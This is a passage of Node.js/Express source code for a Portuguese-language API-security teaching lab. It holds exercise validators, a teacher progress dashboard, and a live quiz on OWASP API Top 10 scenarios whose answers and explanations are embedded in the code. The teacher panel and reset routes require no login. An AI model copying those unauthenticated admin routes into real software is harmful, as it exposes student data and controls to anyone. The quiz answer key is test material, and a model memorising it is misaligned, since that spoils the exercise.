        if (el) document.getElementById('items-' + exId + '-' + col).appendChild(el);
        apiDragItemId = null;
    }
    async function validarDragApis(exId) {
        const fb = document.getElementById('fb-' + exId);
        const classificacao = {};
        document.querySelectorAll('[id^="dragitem-' + exId + '-"]').forEach(el => {
            const id = el.id.replace('dragitem-' + exId + '-', '');
            const par = el.parentElement;
            if (par && par.id.startsWith('items-' + exId + '-')) {
                classificacao[id] = par.id.replace('items-' + exId + '-', '');
            }
        });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, classificacao }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto!'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ ' + res.acertos + '/' + res.total + ' corretos. Revise a classificação.'; fb.style.color='#dc2626'; (res.erros||[]).forEach(id => { const el=document.getElementById('dragitem-'+exId+'-'+id); if(el) el.classList.add('drag-errado'); setTimeout(()=>el.classList.remove('drag-errado'),500); }); }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Toggle (api4 e api12) ---
    async function validarToggleApis(exId, prefix) {
        const fb = document.getElementById('fb-' + exId);
        const ativados = [];
        document.querySelectorAll('[id^="' + prefix + '-' + exId + '-"]').forEach(el => { if(el.checked) ativados.push(el.id.replace(prefix+'-'+exId+'-','')); });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, ativados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto!'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' corretos. Revise os toggles.'; fb.style.color='#dc2626'; }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Hotspot JSON (api6) ---
    function toggleJsonField(exId, id) {
        const el = document.getElementById('jf-' + exId + '-' + id);
        if (el) { el.classList.toggle('hs-selected'); el.classList.remove('hs-erro'); }
    }
    async function validarHotspotJson(exId) {
        const fb = document.getElementById('fb-' + exId);
        const clicados = [];
        document.querySelectorAll('[id^="jf-' + exId + '-"]').forEach(el => { if(el.classList.contains('hs-selected')) clicados.push(el.id.replace('jf-'+exId+'-','')); });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, clicados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto! Esses campos não deveriam estar na resposta.'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' corretos.'; fb.style.color='#dc2626'; (res.erros||[]).forEach(id=>{ const el=document.getElementById('jf-'+exId+'-'+id); if(el) el.classList.add('hs-erro'); }); }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Mapa (api11) ---
    function toggleMapApi(exId, id) {
        const el = document.getElementById('mapapi-' + exId + '-' + id);
        if (el) { el.classList.toggle('selected'); el.classList.remove('mapa-erro'); }
    }
    async function validarMapaApi(exId) {
        const fb = document.getElementById('fb-' + exId);
        const selecionados = [];
        document.querySelectorAll('[id^="mapapi-' + exId + '-"]').forEach(el => { if(el.classList.contains('selected')) selecionados.push(el.id.replace('mapapi-'+exId+'-','')); });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, selecionados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto! Superfície de API mapeada.'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' corretos.'; fb.style.color='#dc2626'; (res.erros||[]).forEach(id=>{ const el=document.getElementById('mapapi-'+exId+'-'+id); if(el) el.classList.add('mapa-erro'); }); }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Ordem (api10 e api14) ---
    let apiOrdemSrcId = null;
    function apiOrdemDragStart(event, id) { apiOrdemSrcId = id; event.dataTransfer.effectAllowed='move'; }
    function apiOrdemDragOver(event, exId, id) {
        event.preventDefault();
        if (!apiOrdemSrcId || apiOrdemSrcId===id) return;
        document.querySelectorAll('.ordem-item').forEach(el=>el.classList.remove('drag-over'));
        const el = document.getElementById('ordemapi-'+exId+'-'+id);
        if (el) el.classList.add('drag-over');
    }
    function apiOrdemDragLeave(event) { event.currentTarget.classList.remove('drag-over'); }
    function apiOrdemDrop(event, exId, targetId) {
        event.preventDefault();
        if (!apiOrdemSrcId || apiOrdemSrcId===targetId) return;
        const list = document.getElementById('ordem-list-'+exId);
        const srcEl = document.getElementById('ordemapi-'+exId+'-'+apiOrdemSrcId);
        const tgtEl = document.getElementById('ordemapi-'+exId+'-'+targetId);
        if (srcEl && tgtEl) list.insertBefore(srcEl, tgtEl);
        document.querySelectorAll('.ordem-item').forEach(el=>el.classList.remove('drag-over'));
        apiOrdemSrcId = null;
    }
    async function validarOrdemApi(exId) {
        const fb = document.getElementById('fb-' + exId);
        const list = document.getElementById('ordem-list-'+exId);
        const ordem = [...list.querySelectorAll('.ordem-item')].map(el=>el.dataset.id);
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, ordem }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Sequência correta!'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' passos na posição certa.'; fb.style.color='#dc2626'; }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Swagger hotspot (api13) ---
    function toggleSwaggerEp(exId, id) {
        const el = document.getElementById('swep-'+exId+'-'+id);
        if (el) { el.classList.toggle('hs-selected'); el.classList.remove('hs-erro'); }
    }
    async function validarSwaggerHotspot(exId) {
        const fb = document.getElementById('fb-' + exId);
        const clicados = [];
        document.querySelectorAll('[id^="swep-'+exId+'-"]').forEach(el=>{ if(el.classList.contains('hs-selected')) clicados.push(el.id.replace('swep-'+exId+'-','')); });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, clicados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto! Endpoints sem autenticação identificados.'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' corretos.'; fb.style.color='#dc2626'; (res.erros||[]).forEach(id=>{ const el=document.getElementById('swep-'+exId+'-'+id); if(el) el.classList.add('hs-erro'); }); }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Blanks (api15) ---
    async function validarBlanksApi(exId) {
        const fb = document.getElementById('fb-' + exId);
        const respostas = {};
        document.querySelectorAll('[id^="ablank-'+exId+'-"]').forEach(el=>{ respostas[el.id.replace('ablank-'+exId+'-','')] = el.value; });
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, respostas }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Relatório preenchido corretamente!'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ '+res.acertos+'/'+res.total+' campos corretos.'; fb.style.color='#dc2626'; (res.erros||[]).forEach(id=>{ const el=document.getElementById('ablank-'+exId+'-'+id); if(el) el.classList.add('blank-erro'); }); }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    // --- Texto simples ---
    async function validarTextoApi(exId) {
        const fb = document.getElementById('fb-' + exId);
        const resposta = document.getElementById('resp-' + exId).value;
        try {
            const r = await fetch('/apis/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, resposta }) });
            const res = await r.json();
            if (res.correto) { fb.textContent='✅ Correto!'; fb.style.color='#16a34a'; document.getElementById('card-'+exId).classList.add('concluido'); document.getElementById('check-'+exId).textContent='✅'; atualizarContadorApis(); }
            else { fb.textContent='❌ Não é bem isso. Tente novamente.'; fb.style.color='#dc2626'; }
        } catch(err) { fb.textContent='❌ Erro: '+err.message; fb.style.color='#dc2626'; }
    }

    async function atualizarContadorApis() {
        try {
            const r = await fetch('/apis/lab/progresso');
            const res = await r.json();
            document.getElementById('contador-progresso').textContent = (res.concluidos||[]).length + ' / 15 concluídos';
        } catch(e) {}
    }

    async function carregarProgressoApis() {
        try {
            const r = await fetch('/apis/lab/progresso');
            const res = await r.json();
            (res.concluidos||[]).forEach(id => {
                const card  = document.getElementById('card-'  + id);
                const check = document.getElementById('check-' + id);
                if (card)  card.classList.add('concluido');
                if (check) check.textContent = '✅';
            });
            document.getElementById('contador-progresso').textContent = (res.concluidos||[]).length + ' / 15 concluídos';
        } catch(err) { console.error('Erro progresso APIs:', err); }
    }

    async function resetarApis() {
        if (!confirm('⚠️ Isso vai zerar todo o seu progresso. Continuar?')) return;
        try {
            const r = await fetch('/apis/lab/reset', { method:'POST' });
            const res = await r.json();
            alert(res.mensagem || res.erro);
            window.location.reload();
        } catch(err) { alert('❌ Erro: ' + err.message); }
    }

    carregarProgressoApis();
`;

// --- Rotas ---
app.get('/apis', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'apis-login.html'));
});

app.post('/apis/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha   = String(req.body.senha   || '').trim();
    const conta   = CREDENCIAIS_APIS[usuario];
    if (!conta || conta.senha !== senha) return res.redirect('/apis?erro=1');
    req.session.apisAluno = usuario;
    req.session.apisNome  = conta.nomeExibicao;
    res.redirect('/apis/lab');
});

app.get('/apis/logout', (req, res) => {
    req.session.apisAluno = null;
    req.session.apisNome  = null;
    res.redirect('/apis');
});

app.get('/apis/painel-professor/dados', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, exercicio_id, concluido_em FROM apis_progresso');
        const dados = {};
        r.rows.forEach(row => { dados[row.aluno + ':' + row.exercicio_id] = row.concluido_em; });
        res.json({ dados, alunos: ALUNOS_APIS.map(a => a.usuario), exercicios: testesApis.map(t => t.id) });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.get('/apis/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, exercicio_id, concluido_em FROM apis_progresso');
        const concluidos = {};
        r.rows.forEach(row => { concluidos[row.aluno + ':' + row.exercicio_id] = row.concluido_em; });

        const headerCols = testesApis.map(t => `<th style="padding:6px 4px;border:1px solid #7C3AED;background:#4C1D95;color:white;font-size:11px;min-width:36px;">${t.id.replace('api','')}</th>`).join('');

        const linhas = ALUNOS_APIS.map(a => {
            const total = testesApis.filter(t => concluidos[a.usuario + ':' + t.id]).length;
            const cels  = testesApis.map(t => {
                const ts = concluidos[a.usuario + ':' + t.id];
                if (ts) return `<td data-ts="${new Date(ts).getTime()}" style="padding:8px 5px;border:1px solid #7C3AED;text-align:center;background:#f0fdf4;font-size:13px;">✅</td>`;
                return `<td style="padding:8px 5px;border:1px solid #7C3AED;text-align:center;background:#faf5ff;font-size:13px;">❌</td>`;
            }).join('');
            return `<tr>
                <td style="padding:8px 10px;border:1px solid #7C3AED;font-weight:600;font-size:13px;white-space:nowrap;">${a.nomeExibicao}</td>
                ${cels}
                <td id="total-${a.usuario}" style="padding:8px 5px;border:1px solid #7C3AED;text-align:center;font-weight:bold;background:#ede9fe;font-size:13px;">${total}/15</td>
                <td style="padding:4px 8px;border:1px solid #7C3AED;text-align:center;">
                    <form method="POST" action="/apis/painel-professor/limpar/${a.usuario}" style="display:inline;">
                        <button type="submit" style="background:#fee2e2;color:#b91c1c;border:none;border-radius:6px;padding:4px 8px;font-size:11px;cursor:pointer;">reset</button>
                    </form>
                </td>
            </tr>`;
        }).join('');

        res.send(`<!DOCTYPE html><html lang="pt-BR"><head>
            <meta charset="UTF-8"><title>Painel — Segurança em APIs</title>
            <style>body{font-family:system-ui,sans-serif;background:#f5f3ff;padding:32px;}
            h1{color:#4C1D95;margin-bottom:4px;} .sub{color:#7C3AED;font-size:13px;margin-bottom:20px;}
            table{border-collapse:collapse;width:100%;background:white;border-radius:10px;overflow:hidden;box-shadow:0 2px 12px rgba(124,58,237,.1);}
            th{text-align:center;} #status-auto{font-size:12px;color:#7C3AED;margin-bottom:12px;}</style>
        </head><body>
            <h1>🔮 Painel do Professor — Segurança em APIs</h1>
            <div class="sub">Aula 18 · Atualização automática a cada 5 segundos</div>
            <div id="status-auto">🟡 Aguardando primeira atualização...</div>
            <div style="overflow-x:auto;">
            <table>
                <thead><tr>
                    <th style="padding:8px 14px;border:1px solid #7C3AED;background:#4C1D95;color:white;text-align:left;">Aluno</th>
                    ${headerCols}
                    <th style="padding:6px 8px;border:1px solid #7C3AED;background:#4C1D95;color:white;">Total</th>
                    <th style="padding:6px 8px;border:1px solid #7C3AED;background:#4C1D95;color:white;">Reset</th>
                </tr></thead>
                <tbody id="tbody-painel">${linhas}</tbody>
            </table>
            </div>
            <script>
                const ALUNOS_PAINEL   = ${JSON.stringify(ALUNOS_APIS.map(a=>a.usuario))};
                const EXERCICIOS_PAI  = ${JSON.stringify(testesApis.map(t=>t.id))};
                async function atualizarPainelApis() {
                    try {
                        const r = await fetch('/apis/painel-professor/dados');
                        const { dados } = await r.json();
                        const agora = Date.now();
                        ALUNOS_PAINEL.forEach(aluno => {
                            let total = 0;
                            EXERCICIOS_PAI.forEach((exId, i) => {
                                const linhas = document.querySelectorAll('#tbody-painel tr');
                                const idx = ALUNOS_PAINEL.indexOf(aluno);
                                const cel = linhas[idx] ? linhas[idx].querySelectorAll('td')[i+1] : null;
                                if (!cel) return;
                                const ts = dados[aluno + ':' + exId];
                                if (ts) {
                                    total++;
                                    if (!cel.dataset.ts) {
                                        cel.dataset.ts = new Date(ts).getTime();
                                        cel.style.background = '#f0fdf4'; cel.style.color = '#15803d';
                                        cel.innerHTML = '✅';
                                    }
                                } else {
                                    cel.style.background = '#faf5ff'; cel.style.color = '#9CA3AF';
                                    cel.innerHTML = '❌'; delete cel.dataset.ts;
                                }
                            });
                            const totEl = document.getElementById('total-' + aluno);
                            if (totEl) totEl.textContent = total + '/15';
                        });
                        document.getElementById('status-auto').textContent = '🟢 Atualizando automaticamente...';
                    } catch(err) { document.getElementById('status-auto').textContent = '🔴 Falha: ' + err.message; }
                }
                setInterval(atualizarPainelApis, 5000);
            </script>
        </body></html>`);
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

app.post('/apis/painel-professor/limpar/:aluno', async (req, res) => {
    const aluno = req.params.aluno;
    if (!CREDENCIAIS_APIS[aluno]) return res.status(400).send('Aluno desconhecido');
    try {
        await pool.query('DELETE FROM apis_progresso WHERE aluno=$1', [aluno]);
        res.redirect('/apis/painel-professor');
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

app.get('/apis/lab', exigirLoginApis, (req, res) => {
    const aluno = req.session.apisAluno;
    const nome  = req.session.apisNome;
    res.send(`<!DOCTYPE html><html><head>
        <meta charset="UTF-8">
        <title>Segurança em APIs — ${escapeHtml(nome)}</title>
        <style>${estiloApis}</style>
    </head><body>
    <div class="container">
        <div class="sidebar">
            <div class="sidebar-brand">
                <h2>🔮 Segurança em APIs</h2>
                <p>Olá, <strong>${escapeHtml(nome)}</strong></p>
            </div>
            <div class="contador-box">
                <p id="contador-progresso">0 / 15 concluídos</p>
            </div>
            <div class="surf-section-title">Conceitos</div>
            <p class="surf-hint">Clique em um conceito para ler antes de responder.</p>
            ${renderSidebarApis()}
            <div class="sidebar-actions">
                <button class="btn-reset" onclick="resetarApis()">🔄 Resetar Progresso</button>
                <a href="/apis/logout" class="btn-logout">🚪 Sair</a>
                <a href="/" class="btn-hub">← Voltar ao Hub</a>
            </div>
        </div>
        <div class="main">
            <div class="main-header">
                <h2>🔮 Segurança em APIs</h2>
                <p>Descubra como APIs expõem dados e funcionalidades — e o que um atacante pode explorar.</p>
            </div>
            ${renderExerciciosApis(aluno)}
        </div>
    </div>
    <script>${scriptApis}</script>
    </body></html>`);
});

app.get('/apis/lab/progresso', exigirLoginApis, async (req, res) => {
    const aluno = req.session.apisAluno;
    try {
        const r = await pool.query('SELECT exercicio_id FROM apis_progresso WHERE aluno=$1', [aluno]);
        res.json({ concluidos: r.rows.map(row => row.exercicio_id) });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.post('/apis/lab/validar', exigirLoginApis, async (req, res) => {
    const aluno = req.session.apisAluno;
    const { exercicioId, resposta, classificacao, selecionados, ordem, ativados, clicados, respostas: blanksR } = req.body;
    const tipo = RESPOSTAS_APIS[exercicioId];
    if (!tipo) return res.status(400).json({ correto: false, erro: 'Exercício desconhecido' });

    let correto = false, acertos = 0, erros = [], total = 0;

    if (tipo === 'drag') {
        const items = exercicioId === 'api3' ? ITEMS_DRAG_API3 : ITEMS_DRAG_API5;
        total = items.length;
        items.forEach(item => {
            if ((classificacao||{})[item.id] === item.correto) { acertos++; }
            else { erros.push(item.id); }
        });
        correto = acertos === total;

    } else if (tipo === 'toggle') {
        const atv = Array.isArray(ativados) ? ativados : [];
        const items = exercicioId === 'api4' ? TOGGLES_API4 : STORIES_API12;
        total = items.length;
        items.forEach(s => {
            const ativado = atv.includes(s.id);
            if (ativado === s.correto) { acertos++; }
            else { erros.push(s.id); }
        });
        correto = acertos === total;

    } else if (tipo === 'hotspot') {
        const cli = Array.isArray(clicados) ? clicados : [];
        const items = exercicioId === 'api6' ? HOTSPOTS_API6 : HOTSPOTS_API13;
        total = items.length;
        items.forEach(h => {
            const clicado = cli.includes(h.id);
            if (clicado === h.correto) { acertos++; }
            else { erros.push(h.id); }
        });
        correto = acertos === total;

    } else if (tipo === 'map') {
        const sel = Array.isArray(selecionados) ? selecionados : [];
        total = ITEMS_MAP_API11.length;
        ITEMS_MAP_API11.forEach(item => {
            const selecionado = sel.includes(item.id);
            if (selecionado === item.correto) { acertos++; }
            else { erros.push(item.id); }
        });
        correto = acertos === total;

    } else if (tipo === 'ordem') {
        const ord = Array.isArray(ordem) ? ordem : [];
        const correta = exercicioId === 'api10' ? ORDEM_CORRETA_API10 : ORDEM_CORRETA_API14;
        total = correta.length;
        correta.forEach((id, i) => { if (ord[i] === id) acertos++; });
        correto = acertos === total;

    } else if (tipo === 'blanks') {
        const rsps = blanksR || {};
        total = BLANKS_API15.length;
        BLANKS_API15.forEach(b => {
            if ((rsps[b.id]||'').trim() === b.correto) { acertos++; }
            else { erros.push(b.id); }
        });
        correto = acertos === total;

    } else {
        const norm = normalizarRespostaApis(resposta);
        correto = Array.isArray(tipo)
            ? tipo.some(v => normalizarRespostaApis(v) === norm)
            : normalizarRespostaApis(tipo) === norm;
    }

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO apis_progresso (aluno, exercicio_id) VALUES ($1,$2) ON CONFLICT (aluno, exercicio_id) DO UPDATE SET concluido_em = NOW()',
                [aluno, exercicioId]
            );
        } catch (err) { console.error('Erro progresso APIs:', err.message); }
    }

    const isSimples = !['drag','toggle','hotspot','map','ordem','blanks'].includes(tipo);
    res.json(isSimples ? { correto } : { correto, acertos, total, erros });
});

app.post('/apis/lab/reset', exigirLoginApis, async (req, res) => {
    const aluno = req.session.apisAluno;
    try {
        await pool.query('DELETE FROM apis_progresso WHERE aluno=$1', [aluno]);
        res.json({ sucesso: true, mensagem: `✅ Progresso de ${aluno} no Lab Segurança em APIs resetado!` });
    } catch (err) { res.status(500).json({ sucesso: false, erro: err.message }); }
});

// =====================================
// SALA DE GUERRA — Jogo colaborativo em tempo real (Aula 18)
// =====================================

const QUESTOES_GUERRA = [
    {
        id: 'q1',
        cenario: 'Pedro acessa <code>GET /api/pedidos/100</code> e vê seus próprios dados. Luís descobre que pode acessar <code>GET /api/pedidos/101</code> e ver os dados de Pedro. Qual categoria OWASP descreve esse problema?',
        opcoes: { A: 'API1 — BOLA (acesso indevido a objetos)', B: 'API2 — Broken Authentication', C: 'API5 — Broken Function Level Auth', D: 'API8 — Security Misconfiguration' },
        correta: 'A',
        explicacao: '✅ API1 — BOLA. A API não verifica se o pedido #101 pertence ao usuário que fez a requisição. Trocar IDs na URL é o sinal clássico.'
    },
    {
        id: 'q2',
        cenario: 'Um endpoint de login <code>POST /api/login</code> não tem nenhum limite de tentativas. Em 1 minuto é possível tentar 10.000 senhas diferentes. Qual categoria OWASP se aplica?',
        opcoes: { A: 'API1 — BOLA', B: 'API2 — Broken Authentication', C: 'API4 — Unrestricted Resource Consumption', D: 'API6 — Unrestricted Access to Sensitive Flows' },
        correta: 'C',
        explicacao: '✅ API4 — Unrestricted Resource Consumption (e também API2 pela falta de proteção no login). O consumo irrestrito de recursos inclui ataques de força bruta sem rate limiting.'
    },
    {
        id: 'q3',
        cenario: 'A resposta de <code>GET /api/usuarios/me</code> retorna: <em>id, nome, email, cpf, senha_hash, saldo_conta, plano, criado_em</em>. O app mobile só exibe nome e email. O que está errado?',
        opcoes: { A: 'Nada — a API retorna mais dados, mas o app filtra', B: 'API3 — Excessive Data Exposure. CPF, senha_hash e saldo não deveriam sair da API', C: 'API8 — Misconfiguration no servidor', D: 'API5 — acesso indevido a funções de admin' },
        correta: 'B',
        explicacao: '✅ API3 — Excessive Data Exposure (ou API3:2023 Broken Object Property Level Auth). A API jamais deve confiar no cliente para filtrar dados sensíveis.'
    },
    {
        id: 'q4',
        cenario: 'Qualquer usuário autenticado consegue chamar <code>DELETE /api/admin/users/5</code> e deletar qualquer conta — sem ser administrador. Qual categoria OWASP é essa?',
        opcoes: { A: 'API1 — BOLA', B: 'API2 — Broken Authentication', C: 'API5 — Broken Function Level Authorization', D: 'API9 — Improper Inventory Management' },
        correta: 'C',
        explicacao: '✅ API5 — Broken Function Level Authorization. A rota de admin não verifica o papel do usuário — qualquer pessoa logada vira admin acidentalmente.'
    },
    {
        id: 'q5',
        cenario: 'Um token JWT é gerado sem campo <code>exp</code> (expiração). O usuário pode usar o mesmo token para sempre, mesmo depois de "sair" do sistema. Qual é a falha?',
        opcoes: { A: 'API4 — Sem rate limiting no endpoint de token', B: 'API2 — Broken Authentication. Tokens sem expiração são um risco de autenticação', C: 'API8 — Misconfiguration do servidor de identidade', D: 'API1 — BOLA no endpoint de logout' },
        correta: 'B',
        explicacao: '✅ API2 — Broken Authentication. Tokens sem expiração permitem que sessões roubadas durem para sempre. Sempre defina `exp` e implemente revogação.'
    },
    {
        id: 'q6',
        cenario: 'O time planeja a sprint e adiciona a história: <em>"Como dev, quero refatorar os testes unitários do serviço de cálculo de frete (sem mudança de comportamento externo)"</em>. Isso cria nova superfície de ataque de API?',
        opcoes: { A: 'Sim — qualquer mudança de código cria risco', B: 'Não — refatoração interna sem novos endpoints ou integrações não expõe nova superfície', C: 'Depende do framework usado', D: 'Sim — testes unitários sempre expõem dados' },
        correta: 'B',
        explicacao: '✅ Não cria nova superfície. Superfície de ataque de API cresce quando surgem novos endpoints, integrações externas ou dados sensíveis trafegando por novas rotas.'
    },
    {
        id: 'q7',
        cenario: 'Ao inspecionar o código-fonte do app mobile (engenharia reversa), um pesquisador encontra a API key hardcoded: <code>X-Api-Key: sk-prod-4f8a...</code>. Qual o maior risco imediato?',
        opcoes: { A: 'Nenhum — a API key está no app, não no servidor', B: 'API8 — Misconfiguration. Qualquer pessoa que descompilar o app tem acesso irrestrito à API', C: 'API4 — Rate limiting. Com a key qualquer um faz scraping', D: 'B e C estão ambos corretos — mas o maior é a exposição da credencial (API8)' },
        correta: 'D',
        explicacao: '✅ D — A exposição da credencial é API8/Misconfiguration, e com ela o atacante pode fazer rate limit abuse (API4). Nunca hardcode secrets em clientes.'
    },
    {
        id: 'q8',
        cenario: 'Durante o teste em homolog, você descobre que <code>GET /api/relatorio-vendas</code> retorna dados de todas as vendas da empresa sem exigir autenticação — basta saber a URL. Como classificar?',
        opcoes: { A: 'API1 — BOLA (acesso a objeto sem autorização)', B: 'API5 — Broken Function Level Auth. Relatório é função privilegiada, não objeto individual', C: 'API9 — Improper Inventory Management. O endpoint não estava documentado', D: 'API2 — Broken Auth. Faltou token obrigatório' },
        correta: 'B',
        explicacao: '✅ API5 — Broken Function Level Auth. O relatório de vendas é uma funcionalidade privilegiada (deveria ser só de admin/gerência) — e não um objeto individual de um usuário.'
    },
    {
        id: 'q9',
        cenario: 'Em homolog existe o endpoint <code>GET /api/debug/dump-database</code> que exporta todo o banco. Em produção esse endpoint deveria existir?',
        opcoes: { A: 'Sim — ferramenta de debug é útil em produção também', B: 'Só se estiver protegido por senha', C: 'Não — endpoints de debug nunca devem ir para produção (API9 — Improper Inventory Management)', D: 'Depende da política da empresa' },
        correta: 'C',
        explicacao: '✅ API9 — Improper Inventory Management. Endpoints de debug, versões antigas e rotas não documentadas em produção são vetores de ataque que deveriam estar desativados.'
    },
    {
        id: 'q10',
        cenario: 'Fim de sprint: a equipe detectou 3 vulnerabilidades de API. Qual deve ser a PRIMEIRA a corrigir? 1) JWT sem expiração em todas as rotas 2) Campo "cpf" retornado desnecessariamente em um endpoint 3) Endpoint de admin sem verificação de papel',
        opcoes: { A: '1 — JWT sem expiração afeta toda a superfície de autenticação', B: '2 — Dado sensível exposto é prioridade LGPD', C: '3 — Escalação de privilégio para admin é o risco mais crítico', D: 'Todas têm a mesma prioridade — corrigir em paralelo' },
        correta: 'C',
        explicacao: '✅ C — Broken Function Level Auth (admin sem verificação) é o risco mais crítico: permite que qualquer usuário logado apague contas, acesse dados de todos ou tome controle do sistema.'
    },
];

let estadoGuerra = {
    fase: 'aguardando',   // aguardando | votando | revelado | finalizado
    rodadaAtual: 0,       // 0 = não iniciado, 1–10 = rodada ativa
    votos: {},            // { aluno: 'A'|'B'|'C'|'D' } rodada atual
    historico: [],        // [{ rodada, correta, votos:{...}, pontosGanhos }]
    pontosTime: 0,
    acertosPorAluno: {},  // { aluno: count }
    iniciadoEm: null,
};

function snapEstadoPublico(aluno) {
    const q = QUESTOES_GUERRA[estadoGuerra.rodadaAtual - 1] || null;
    const totalVotos = Object.keys(estadoGuerra.votos).length;
    const meuVoto   = estadoGuerra.votos[aluno] || null;

    // Distribuição só revelada após resposta
    let distribuicao = null;
    if (estadoGuerra.fase === 'revelado' || estadoGuerra.fase === 'finalizado') {
        distribuicao = { A:0, B:0, C:0, D:0 };
        Object.values(estadoGuerra.votos).forEach(v => { if (distribuicao[v] !== undefined) distribuicao[v]++; });
    }

    return {
        fase:        estadoGuerra.fase,
        rodadaAtual: estadoGuerra.rodadaAtual,
        totalRodadas: QUESTOES_GUERRA.length,
        totalVotos,
        totalAlunos:  ALUNOS_APIS.length,
        meuVoto,
        pontosTime:  estadoGuerra.pontosTime,
        acertosPorAluno: estadoGuerra.acertosPorAluno,
        historico:   estadoGuerra.historico,
        questao: q ? {
            id:      q.id,
            cenario: q.cenario,
            opcoes:  q.opcoes,
            correta: estadoGuerra.fase === 'revelado' || estadoGuerra.fase === 'finalizado' ? q.correta : null,
            explicacao: estadoGuerra.fase === 'revelado' || estadoGuerra.fase === 'finalizado' ? q.explicacao : null,
        } : null,
        distribuicao,
        acertouRodada: estadoGuerra.fase === 'revelado' && q ? meuVoto === q.correta : null,
        votosNomes: estadoGuerra.fase === 'revelado' || estadoGuerra.fase === 'finalizado'
            ? Object.fromEntries(ALUNOS_APIS.map(a => [a.usuario, estadoGuerra.votos[a.usuario] || null]))
            : null,
    };
}

app.get('/apis/guerra', exigirLoginApis, (req, res) => {
    const nome = req.session.apisNome;
    res.send(`<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8"><title>Sala de Guerra — APIs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing:border-box; margin:0; padding:0; }
        body { font-family:'IBM Plex Sans',system-ui,sans-serif; background:#0f0e17; color:#fffffe; min-height:100vh; }
        .topo { display:flex; justify-content:space-between; align-items:center; padding:14px 24px; background:#1a1830; border-bottom:1px solid #2d2a5e; }
        .topo-brand { font-size:18px; font-weight:800; color:#a78bfa; }
        .topo-info  { font-size:12px; color:#7c6fcd; }
        .placar { display:flex; gap:32px; justify-content:center; padding:18px; background:#130f2a; border-bottom:1px solid #2d2a5e; }
        .placar-item { text-align:center; }
        .placar-n  { font-size:28px; font-weight:800; color:#a78bfa; line-height:1; }
        .placar-l  { font-size:10px; color:#7c6fcd; text-transform:uppercase; letter-spacing:.07em; margin-top:3px; }
        .main { max-width:680px; margin:0 auto; padding:28px 20px; }
        .aguardando { text-align:center; padding:60px 20px; }
        .aguardando h2 { font-size:22px; color:#a78bfa; margin-bottom:10px; }
        .aguardando p  { color:#7c6fcd; font-size:14px; }
        .pulse { animation: pulse 2s infinite; }
